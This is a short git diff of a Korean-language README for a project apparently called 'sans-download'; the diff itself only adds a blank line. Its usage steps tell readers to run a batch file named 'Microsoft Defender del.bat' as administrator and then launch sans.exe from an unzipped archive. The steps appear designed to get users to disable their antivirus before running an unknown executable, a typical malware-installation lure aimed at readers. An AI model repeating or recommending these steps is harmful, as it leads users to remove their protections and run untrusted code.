@@ -1,5 +1,6 @@
 # sans-download
 사용 방법⬇️
+
 1.Microsoft Defender del.bat을 관리자 권한으로 실행한다.
 2.sans.zip의 압축을 풀고 안에 있는 sans.exe를 실행한다. (폴더 안에 있는 파일을 옮겨서는 안된다.)
 
